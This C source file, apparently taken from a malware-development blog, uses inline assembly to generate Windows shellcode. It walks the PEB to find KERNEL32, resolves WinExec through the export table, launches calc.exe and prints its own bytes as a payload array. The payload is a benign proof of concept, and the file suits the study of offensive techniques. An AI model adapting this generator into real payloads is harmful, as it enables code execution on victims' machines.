/*
Code from
https://steve-s.gitbook.io/0xtriboulet/just-malicious/from-c-with-inline-assembly-to-shellcode
*/

//  manual compilation command:
//  x86_64-w64-mingw32-gcc main.c -O -masm=intel -o msg_shellcode.exe
//  -Wno-int-conversion

#include <stdio.h>
#include <windows.h>
#include "../../includes/structs.h"

typedef UINT(WINAPI* WinExec_t)(LPCSTR lpCmdLine, UINT uCmdShow);

INT mem_cmp(CONST VOID* str1, CONST VOID* str2, SIZE_T n);
HANDLE LocalGetModuleHandle(CONST CHAR* sModuleName);
PVOID LocalGetProcAddress(HANDLE pBase, CONST CHAR* sFuncName);

INT main() {
  PVOID pvStartAddress = NULL;
  PVOID pvEndAddress = NULL;

  __asm("StartAddress:;");

  //  Align the stack
  __asm(
      "and rsp, 0xfffffffffffffff0;"
      "mov rbp, rsp;"
      "sub rsp, 0x200"  //  allocate stack space, arbitrary size...depends on
                        //  payload
  );

  CHAR sKernel32[] = "KERNEL32\0";

  CHAR sWinExec[] = "WinExec\0";

  CHAR sCalcExe[] = "calc.exe\0";

  WinExec_t pWinExec =
      (WinExec_t)LocalGetProcAddress(LocalGetModuleHandle(sKernel32), sWinExec);
  pWinExec(sCalcExe, 0);

  //  Print the shellcode
  __asm("add rsp, 0x200;");  //  Cleanup stack
  __asm("EndAddress:;");

  __asm("lea %0, [rip+StartAddress];" : "=r"(pvStartAddress));

  __asm("lea %0, [rip+EndAddress];" : "=r"(pvEndAddress));

  printf("Start address: %p\n", pvStartAddress);
  printf("End address: %p\n", pvEndAddress);

  CONST UCHAR* pStart = (CONST UCHAR*)pvStartAddress;
  CONST UCHAR* pEnd = (CONST UCHAR*)pvEndAddress;

  printf("UCHAR payload[] = {");
  while (pStart < (pEnd - 1)) {
    printf("0x%02x,", *pStart);
    pStart++;
  }
  printf("0x%02x", *pStart);
  printf("};\n");

  return 0;
}

inline __attribute__((always_inline)) HANDLE LocalGetModuleHandle(
    CONST CHAR* sModuleName) {
  PPEB pPeb = NULL;
  HANDLE pBase = NULL;

  //  PEB
  __asm("mov %0, gs:[0x60];" : "=r"(pPeb));

  //  Getting the Ldr
  PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

  //  Getting the first element in the linked list which contains information
  //  about the first module
  PLDR_DATA_TABLE_ENTRY pDte =
      (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

  while (pDte) {
    //  If not null
    if (pDte->FullDllName.Length != (USHORT)0x0) {
      //  Check if both equal
      if (mem_cmp(pDte->FullDllName.Buffer, sModuleName, 0x1) == 0) {
        //  Found sModuleName
        pBase = (HMODULE)(pDte->InInitializationOrderLinks.Flink);

        return pBase;
      }

    } else {
      break;
    }

    //  Next element in the linked list
    pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
  }

  return NULL;
}

inline __attribute__((always_inline)) PVOID LocalGetProcAddress(
    HANDLE pBase, CONST CHAR* sFuncName) {
  //  Getting the dos header and doing a signature check
  PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;

  //  Getting the nt headers and doing a signature check
  PIMAGE_NT_HEADERS pImgNtHdrs =
      (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);

  //  Getting the optional header
  IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;

  //  Getting the image export table
  PIMAGE_EXPORT_DIRECTORY pImgExportDir =
      (PIMAGE_EXPORT_DIRECTORY)(pBase +
                                ImgOptHdr
                                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                                    .VirtualAddress);

  //  Getting the function's names array pointer
  PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);

  //  Getting the function's addresses array pointer
  PDWORD FunctionAddressArray =
      (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);

  //  Getting the function's ordinal array pointer
  PWORD FunctionOrdinalArray =
      (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

  //  Looping through all the exported functions
  for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
    //  Getting the name of the function
    CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

    //  Getting the address of the function through its ordinal
    PVOID pFunctionAddress =
        (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

    //  Searching for the function specified
    if (mem_cmp(sFuncName, pFunctionName, 0x7) == 0) {
      return pFunctionAddress;
    }
  }

  return NULL;
}

inline __attribute__((always_inline)) INT mem_cmp(CONST VOID* str1,
                                                  CONST VOID* str2, SIZE_T n) {
  CONST UCHAR* s1 = (CONST UCHAR*)str1;
  CONST UCHAR* s2 = (CONST UCHAR*)str2;

  while (n--) {
    if (*s1 != *s2) return *s1 - *s2;
    s1++;
    s2++;
  }
  return 0;
}
